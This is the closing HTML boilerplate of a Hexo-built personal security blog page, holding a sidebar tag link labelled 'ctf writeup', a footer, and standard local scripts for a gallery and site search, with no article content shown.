	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
